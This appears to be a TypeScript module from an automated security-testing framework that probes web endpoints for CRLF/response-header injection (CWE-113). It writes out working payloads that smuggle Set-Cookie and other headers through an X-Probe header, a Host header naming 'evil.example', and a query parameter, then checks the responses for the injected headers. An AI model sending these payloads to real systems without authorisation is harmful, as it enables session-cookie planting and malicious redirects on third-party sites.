/**
 * headerInjection — CRLF / response-header injection primitive.
 *
 * Probes for HTTP header injection (CWE-113): a CRLF in a header or param that
 * lets an attacker inject response headers (Set-Cookie, Location, ...). The
 * oracle confirms ONLY when the injected header actually appears in the real
 * response headers AND the claim is verified by the EvidenceGate.
 */
import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'
import { getPayloadStore } from '../payloads/store'

const CRLF = () => (getPayloadStore().getPayloads('header-injection/crlf', 'crlf'))[0] ?? '\r\n'
const INJECTED_COOKIE = () => (getPayloadStore().getPayloads('header-injection/crlf', 'cookie_inject'))[0] ?? 'pwned=1'

export const headerInjection: TechniquePrimitive = {
  id: 'headerInjection',
  name: 'HTTP Header / CRLF Injection',
  description: 'Probe for CRLF/response-header injection (Set-Cookie/Location injection) via headers and params; confirm via injected header in the real response.',
  technique: 'header-injection',
  appliesTo(ctx: TechniqueContext): boolean {
    return !!(ctx.endpoint || ctx.target)
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const url = ctx.endpoint?.url ?? ctx.target!
    const method = ctx.endpoint?.method ?? 'GET'
    const baseHeaders = { ...(ctx.sessionHeaders ?? {}) }
    const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name
    const crlf = CRLF()
    const injectedCookie = INJECTED_COOKIE()
    const steps: AttackStep[] = []

    steps.push({
      id: 'crlf-header',
      description: 'CRLF injection via X-Probe header',
      request: { method, url, headers: { ...baseHeaders, 'X-Probe': `x${crlf}Set-Cookie: ${injectedCookie}` } },
      expectedSignal: 'response contains injected Set-Cookie',
      metadata: { kind: 'crlf', label: 'header' },
    })
    steps.push({
      id: 'crlf-host',
      description: 'CRLF injection via Host header',
      request: { method, url, headers: { ...baseHeaders, Host: `evil.example${crlf}X-Injected: 1` } },
      expectedSignal: 'response reflects injected header',
      metadata: { kind: 'crlf', label: 'host' },
    })
    if (param) {
      try {
        const u = new URL(url)
        u.searchParams.set(param, `x${crlf}Set-Cookie: ${injectedCookie}`)
        steps.push({
          id: 'crlf-param',
          description: `CRLF injection via param ${param}`,
          request: { method, url: u.toString(), headers: baseHeaders },
          expectedSignal: 'response contains injected Set-Cookie',
          metadata: { kind: 'crlf', label: 'param' },
        })
      } catch {
        /* ignore invalid url */
      }
    }
    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const evidence: PrimitiveResult['evidence'] = []
    let hit = false
    const injectedCookie = INJECTED_COOKIE()
    for (const r of results) {
      const headers = r.headers ?? {}
      const cookie = headers['set-cookie'] ?? headers['Set-Cookie']
      const location = headers['location'] ?? headers['Location']
      const injected =
        (typeof cookie === 'string' && cookie.includes(injectedCookie)) ||
        (Array.isArray(cookie) && cookie.some((c) => String(c).includes(injectedCookie))) ||
        (typeof location === 'string' && location.includes('evil.example'))
      if (injected) {
        hit = true
        evidence.push({
          kind: 'response',
          label: `Header injection via ${r.step.metadata?.label} ${r.step.request.method} ${r.step.request.url} → ${r.status}`,
          data: `headers: ${JSON.stringify(headers).slice(0, 800)}`,
        })
      }
    }

    const { verified } = evidenceGate.verifyClaim(
      claimFor('header_injection', results[0]?.step.request.url, results[0]?.status, results[0]?.step.request.method),
    )
    const confirmed = hit && verified
    return {
      confirmed,
      confidence: confirmed ? 0.85 : hit ? 0.5 : 0.05,
      evidence,
      severity: confirmed ? 'medium' : undefined,
      finding: confirmed
        ? {
            category: 'header_injection',
            description: `CRLF/response-header injection on ${results[0]?.step.request.url ?? ''} (via ${results[0]?.step.metadata?.label}).`,
            request: results[0]?.step.request,
            response: { status: results[0]?.status ?? 0, body: '' },
            cwe: 'CWE-113',
          }
        : undefined,
      note: `hit=${hit} verified=${verified}`,
    }
  },
}
